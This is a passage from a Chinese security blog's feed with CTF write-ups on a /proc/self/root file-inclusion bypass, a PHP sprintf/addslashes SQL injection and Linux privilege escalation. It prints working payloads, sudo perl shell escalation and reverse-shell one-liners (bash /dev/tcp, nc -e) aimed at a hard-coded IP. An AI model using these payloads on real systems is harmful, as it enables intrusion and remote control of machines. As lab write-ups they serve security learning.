src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004720854.png" alt="image-20250426004720854"></p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004801020.png" alt="image-20250426004801020"></p><p>成功反弹<code>shell</code>，并且是<code>root</code>权限，在<code>/root</code>目录下找到隐藏文件<code>.root.txt</code>得到<code>rootflag</code></p><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426004839093.png" alt="image-20250426004839093"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r00t&#123;H4ckth3p14n3t&#125;<br></code></pre></td></tr></table></figure><h4 id="直接用perl提权"><a href="#直接用perl提权" class="headerlink" title="直接用perl提权"></a>直接用<code>perl</code>提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/x%E5%A4%8D%E7%8E%B0/image-20250426005156575.png" alt="image-20250426005156575"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r00t&#123;H4ckth3p14n3t&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透 打靶、复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>符号链接突破目录限制</title>
    <link href="/2025/04/25/%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E7%AA%81%E7%A0%B4%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6/"/>
    <url>/2025/04/25/%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E7%AA%81%E7%A0%B4%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;starven_secret.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;还想非预期?&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在 PHP 中，<code>require_once</code> 和 <code>include_once</code> 在调用时PHP 会先检查一个内部的记录结构（可近似理解为哈希表，存储已包含文件的路径信息），看要包含的文件路径是否已经存在于其中。如果存在，就不再重复执行包含操作；如果不存在，才会将文件内容包含进来，并把该文件的路径记录到这个结构中</p><h4 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a><strong>小知识点</strong></h4><p><code>/proc/self</code>：在 Linux 系统中，&#x2F;proc 是一个虚拟文件系统，存储着当前系统运行进程的相关信息，&#x2F;proc&#x2F;self是一个特殊的符号链接，它会动态指向当前正在执行进程对应的 <code>/proc/</code> 下的具体进程目录（目录名是进程 ID，即 <code>/proc/pid/</code> ）。例如，若当前进程 ID 是 <code>1234</code> ，那么 <code>/proc/self</code> 就等同于 <code>/proc/1234/</code></p><p><code>/proc/self/root</code>：它也是一个符号链接，指向系统的根目录（<code>/</code> ） 。在一些受限制的环境（如容器环境 ）中，通过这个符号链接可以突破当前目录限制，访问到系统根目录下的文件</p><h4 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a><strong>符号链接</strong></h4><p>符号链接也叫做软连接，是一类特殊文件，其本质是包含指向其他文件或目录的引用的文本文件，该引用以绝对路径或相对路径形式存在</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>starven_secret.php<br></code></pre></td></tr></table></figure><p>利用符号链接<code>/proc/self/root</code>突破目录限制，<code>/proc/self/root</code>作为指向根目录的符号链接，多次使用可突破代码可能存在的当前目录范围限制</p><p>可以利用<code>/proc/self/root</code>，可以构造出指向任意文件的路径，即使代码没用直接访问<code>/var/www/html/starven_secret.php</code>的权限，也可以通过<code>/proc/self/root</code>逐步导航到目标文件所在位置，从而绕过可能存在的目录访问限制，实现对敏感文件的访问</p>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sprintf漏洞</title>
    <link href="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="sprintf函数"><a href="#sprintf函数" class="headerlink" title="sprintf函数"></a><code>sprintf</code>函数</h1><h3 id="函数功能"><a href="#函数功能" class="headerlink" title="函数功能"></a>函数功能</h3><p><code>sprintf</code>是 PHP 中一个格式化字符串的函数，功能是根据指定的格式化字符串，将一系列参数转换并格式化为一个新的字符串</p><h3 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">sprintf</span>(format, arg1, arg2,...)<br></code></pre></td></tr></table></figure><ul><li><code>format</code>：是必需参数，规定字符串以及如何格式化其中的变量，如果 <code>format</code> 字符串中不包含任何占位符（如 <code>%s</code>、<code>%d</code> 等），那么可以不需要额外的 <code>arg</code> 参数</li><li><code>arg1, arg2,...</code>：可选参数，要被插入到<code>format</code>字符串中指定位置的参数，可以有多个</li></ul><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">format</td><td align="left">必需。规定字符串以及如何格式化其中的变量。可能的格式值：<br/><br/>%% - 返回一个百分号 %<br/><br/>%b - 二进制数<br/><br/>%c - ASCII 值对应的字符<br/><br/>%d - 包含正负号的十进制数（负数、0、正数）<br/><br/>%e - 使用小写的科学计数法（例如 1.2e+2）<br/><br/>%E - 使用大写的科学计数法（例如 1.2E+2）<br/><br/>%u - 不包含正负号的十进制数（大于等于 0）<br/><br/>%f - 浮点数（本地设置）<br/><br/>%F - 浮点数（非本地设置）<br/><br/>%g - 较短的 %e 和 %f<br/><br/>%G - 较短的 %E 和 %f<br/><br/>%o - 八进制数<br/><br/>%s - 字符串<br/><br/>%x - 十六进制数（小写字母）<br/><br/>%X - 十六进制数（大写字母）<br/><br/>附加的格式值。必需放置在 % 和字母之间（例如 %.2f）：<br/><br/>+ （在数字前面加上 + 或 - 来定义数字的正负性。默认情况下，只有负数才做标记，正数不做标记）<br/><br/>‘ （规定使用什么作为填充，默认是空格。它必须与宽度指定器一起使用。例如：%’x20s（使用 “x” 作为填充））<br/><br/>- （左调整变量值）<br/><br/>[0-9] （规定变量值的最小宽度）<br/><br/>.[0-9] （规定小数位数或最大字符串长度）<br/><br/>注释：如果使用多个上述的格式值，它们必须按照以上顺序使用<br/></td></tr><tr><td align="center">arg1</td><td align="left">如果<code>format</code>中有占位符（如 <code>%s</code>、<code>%d</code> 等），这个参数是必需的，规定插到 <em>format</em> 字符串中第一个 % 符号处的参数</td></tr><tr><td align="center">arg2</td><td align="left">可选，规定插到 <em>format</em> 字符串中第二个 % 符号处的参数</td></tr></tbody></table><h3 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h3><ul><li><strong>格式化数字</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$num</span> = <span class="hljs-number">123.456</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%.2f&quot;</span>, <span class="hljs-variable">$num</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-comment">// 输出 123.46，将数字格式化为保留两位小数的字符串</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331135554907.png" alt="image-20250331135554907"></p><ul><li><strong>拼接字符串和变量</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;John&quot;</span>;<br><span class="hljs-variable">$age</span> = <span class="hljs-number">30</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;My name is %s and I&#x27;m %d years old.&quot;</span>, <span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-comment">// 输出 My name is John and I&#x27;m 30 years old.</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331135700220.png" alt="image-20250331135700220"></p><ul><li><strong>格式化日期</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$timestamp</span> = <span class="hljs-title function_ invoke__">time</span>();<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%02d-%02d-%d&quot;</span>, <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-variable">$timestamp</span>), <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-variable">$timestamp</span>), <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-variable">$timestamp</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-comment">// 输出当前日期，格式为 mm-dd-yyyy</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331135759133.png" alt="image-20250331135759133"></p><h1 id="sprintf函数存在的漏洞"><a href="#sprintf函数存在的漏洞" class="headerlink" title="sprintf函数存在的漏洞"></a><code>sprintf</code>函数存在的漏洞</h1><h2 id="占位符漏洞"><a href="#占位符漏洞" class="headerlink" title="占位符漏洞"></a>占位符漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>格式化字符串函数在处理占位符时，会按照特定规则将传入的参数替换到占位符所在的位置，当用户能够控制格式化字符串（包含占位符）或部分参数时，就可能出现安全问题。</p><p>攻击者可以利用特殊构造的格式化字符串来读取内存中的敏感信息、修改内存数据、甚至执行任意代码。</p><h3 id="1"><a href="#1" class="headerlink" title="%1$"></a><code>%1$</code></h3><p><code>%1$</code>是格式化字符串中的一种高级占位符用法，在格式化字符串中，<code>%</code>通常是占位符的起始符号。<code>%1$</code> 中的 <code>1</code> 代表参数列表中的第 1 个参数（编号从 1 开始），<code>$</code> 是分隔符，它的作用是明确指定要使用的参数序号。借助这种方式，你能够精确控制在格式化字符串中使用哪个参数进行替换，还可以多次使用同一个参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">sprintf</span>(format, arg1, arg2, arg++)<br></code></pre></td></tr></table></figure><p>arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</p><p><strong>如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “$” 组成</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;a=%2\$s, b=%1\$s&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>);<br><span class="hljs-comment">// 执行结果为：a=b, b=a</span><br></code></pre></td></tr></table></figure><p><code>%2\$s</code> 表示将第 2 个参数（即 <code>&quot;b&quot;</code> ）以字符串类型插入，<code>%1\$s</code> 表示将第 1 个参数（即 <code>&quot;a&quot;</code> ）以字符串类型插入。所以最终输出 <code>a=b, b=a</code> 。 其中 <code>\</code> 是转义字符，用来转义 <code>$</code> ，防止它被 shell 等环境提前解析 ，确保 <code>sprintf</code> 函数能正确识别占位符。 而 <code>%2$s</code> 里的 <code>2</code> 指明用第 2 个参数，<code>s</code> 表明参数类型为字符串。</p><h3 id="sprintf底层实现代码"><a href="#sprintf底层实现代码" class="headerlink" title="sprintf底层实现代码"></a><code>sprintf</code>底层实现代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">switch</span> (format[inpos]) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>    &#123;<br>        zend_string * t;<br>        zend_string * str = <span class="hljs-title function_ invoke__">zval_get_tmp_string</span>(tmp, &amp;t);<br>        <span class="hljs-title function_ invoke__">php_sprintf_appendstring</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">ZSTR_VAL</span>(str), width, precision, padding, alignment, <span class="hljs-title function_ invoke__">ZSTR_LEN</span>(str), <span class="hljs-number">0</span>, expprec, <span class="hljs-number">0</span>);<br>        <span class="hljs-title function_ invoke__">zend_tmp_string_release</span>(t);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appendint</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, always_sign);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appenduint</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;g&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;G&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;e&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;f&#x27;</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;F&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appenddouble</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_double</span>(tmp), width, padding, alignment, precision, adjusting, format[inpos], always_sign);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appendchar</span>( &amp; result, &amp;outpos, (char) <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp));<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;o&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">3</span>, hexchars, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">4</span>, hexchars, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;X&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">4</span>, HEXCHARS, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_append2n</span>( &amp; result, &amp;outpos, <span class="hljs-title function_ invoke__">zval_get_long</span>(tmp), width, padding, alignment, <span class="hljs-number">1</span>, hexchars, expprec);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;%&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">php_sprintf_appendchar</span>( &amp; result, &amp;outpos, <span class="hljs-string">&#x27;%&#x27;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过底层实现代码可以发现，<code>sprintf（）</code>方法就是对15种类型做了匹配，15种类型以外的就直接break了没有做任何处理，所以就会导致一个问题：</p><p>如果我们输入<code>%</code>\或者<code>%1$\</code>,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么<code>%\</code>,<code>%1$\</code>就因为没有经过任何处理而被替换为空。</p><p>因此<code>sprintf</code>注入的原理就是用一个15种类型之外的<code>\</code>来代替格式字符类型让函数替换为空，则<code>%1$\&#39;</code>后面的单引号就能闭合前面的单引号。</p><p>此外，还要注意**函数<code>addslashes()</code>**作用是返回在预定义字符之前添加反斜杠的字符串。预定义字符是单引号<code>&#39;</code>、双引号<code>&quot;</code>、反斜杠<code>\</code>、<code>NULL</code>。比如下面的代码，这样就造成了得结果是我们无法在注入的过程当中使用单引号（’）</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331182802265.png" alt="image-20250331182802265"></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目来源</p><blockquote><p>NSSCTF–git泄露</p></blockquote><p>这是这题的后半部分的考点，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]));<br><span class="hljs-variable">$sql</span>=<span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;select * from user where name=&#x27;%s&#x27; <span class="hljs-subst">$pass</span>&quot;</span>,<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码，这段代码通过<code>GET</code>请求的<code>name</code>和<code>pass</code>参数，构造一条<code>SQL</code>查询语句，从 <code>user</code> 表中筛选出符合特定条件的记录。</p><p><code>payload</code>如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>&amp;pass=123%1$&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--+<br></code></pre></td></tr></table></figure><p><strong><code>addslashes()</code>将’转义成&#39; 则passpass&#x3D;123%1$&#39;</strong></p><p>最终构造的SQL语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> pass<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--+&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331184548380.png" alt="image-20250331184548380"></p><p>可以看到跳转到<code>wjbh.php</code>这个页面了，虽然表面上看着是<code>Not Found</code>，但这实际是出题人写来混淆的，抓包可以知道状态码是200，查看源码可以看到<code>flag</code>的位置在<code>/flag</code></p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331184805384.png" alt="image-20250331184805384"></p><p>但是访问后却发现又回到最初的界面了</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331184936727.png" alt="image-20250331184936727"></p><p>那就去抓包看看</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185243464.png" alt="image-20250331185243464"></p><p>发现<code>cookie</code>请求头中有一个参数<code>file</code>，对其值进行 Hex 解码</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185501796.png" alt="image-20250331185501796"></p><p>解出<code>flag.txt</code>，访问又是什么都没有，再继续抓包</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185545261.png" alt="image-20250331185545261"></p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331185805000.png" alt="image-20250331185805000"></p><p>没什么区别，看到之前的<code>cookie</code>参数<code>file</code>，想到是不是用来读取<code>flag.txt</code>这个文件的，但是没有读到，要是给它加上伪协议读取呢</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190020446.png" alt="image-20250331190020446"></p><p>还是不行</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190440729.png" alt="image-20250331190440729"></p><p>想到之前的提示在<code>/flag</code>文件中，那就读取这个文件</p><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190532826.png" alt="image-20250331190532826"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">file</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>f666c6167<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/image-20250331190609726.png" alt="image-20250331190609726"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">31</span>ba3d58-<span class="hljs-number">60</span>d3-<span class="hljs-number">40</span>f8-<span class="hljs-number">9</span>e39-<span class="hljs-number">291</span>c554cdf46&#125;<br></code></pre></td></tr></table></figure><p>这就出flag了，好难的萌新赛</p>]]></content>
    
    
    <categories>
      
      <category>小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提权</title>
    <link href="/2025/04/25/%E6%8F%90%E6%9D%83/"/>
    <url>/2025/04/25/%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="用VPS反弹shell"><a href="#用VPS反弹shell" class="headerlink" title="用VPS反弹shell"></a>用VPS反弹shell</h2><p><strong>攻击机监听端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><p><strong>目标机</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | <span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNzUuMTI2LzIzMzMgMD4mMQ== | <span class="hljs-built_in">base64</span> -d| /bin/bash<br>127.0.0.1 | <span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>nc -e /bin/sh 47.122.75.126 2333<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="已知一个用户的密码"><a href="#已知一个用户的密码" class="headerlink" title="已知一个用户的密码"></a><strong>已知一个用户的密码</strong></h3><ul><li>用<code>cat /etc/passwd</code>命令来查看用户</li><li>用<code>su 用户名</code>命令来切换用户，尝试出已知的密码是哪一个用户的</li><li>用<code>sudo -l</code>命令来查看当前用户的权限</li></ul><h3 id="tar包提权"><a href="#tar包提权" class="headerlink" title="tar包提权"></a><strong>tar包提权</strong></h3><p>如果管理员给予了某个普通用户tar命令的超级管理员操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 